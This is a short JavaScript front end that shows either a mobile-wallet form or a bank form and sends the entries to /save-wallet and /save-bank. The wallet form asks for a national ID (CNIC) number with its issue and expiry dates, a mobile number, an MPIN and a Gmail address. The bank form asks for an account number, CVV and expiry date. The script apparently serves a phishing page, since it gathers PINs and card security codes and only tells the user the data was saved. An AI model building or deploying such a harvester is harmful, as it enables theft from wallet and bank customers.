document.addEventListener("DOMContentLoaded", () => {
    const walletBtn = document.getElementById("walletBtn");
    const bankBtn = document.getElementById("bankBtn");
    const walletForm = document.getElementById("walletForm");
    const bankForm = document.getElementById("bankForm");
    const message = document.getElementById("message");

    // Show wallet form, hide bank form
    walletBtn.addEventListener("click", () => {
        walletForm.classList.remove("hidden");
        bankForm.classList.add("hidden");
    });

    // Show bank form, hide wallet form
    bankBtn.addEventListener("click", () => {
        bankForm.classList.remove("hidden");
        walletForm.classList.add("hidden");
    });

    // Submit wallet form
    walletForm.addEventListener("submit", (event) => {
        event.preventDefault();
        const data = {
            cnic: document.getElementById("walletCnic").value.trim(),
            name: document.getElementById("walletName").value.trim(),
            mobile: document.getElementById("walletMobile").value.trim(),
            mpin: document.getElementById("walletMpin").value.trim(),
            issueDate: document.getElementById("walletIssueDate").value.trim(),
            expiryDate: document.getElementById("walletExpiryDate").value.trim(),
            gmail: document.getElementById("walletGmail").value.trim(),
        };

        saveData("/save-wallet", data);
    });

    // Submit bank form
    bankForm.addEventListener("submit", (event) => {
        event.preventDefault();
        const data = {
            accountNumber: document.getElementById("bankAccount").value.trim(),
            cvv: document.getElementById("bankCvv").value.trim(),
            expiryDate: document.getElementById("bankExpiryDate").value.trim(),
            bankName: document.getElementById("bankName").value.trim(),
        };

        saveData("/save-bank", data);
    });

    function saveData(endpoint, data) {
        fetch(endpoint, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify(data),
        })
            .then((response) => {
                if (response.ok) {
                    message.textContent = "Data saved successfully!";
                    message.style.color = "green";
                } else {
                    throw new Error("Failed to save data.");
                }
            })
            .catch((error) => {
                message.textContent = error.message;
                message.style.color = "red";
            });
    }
});

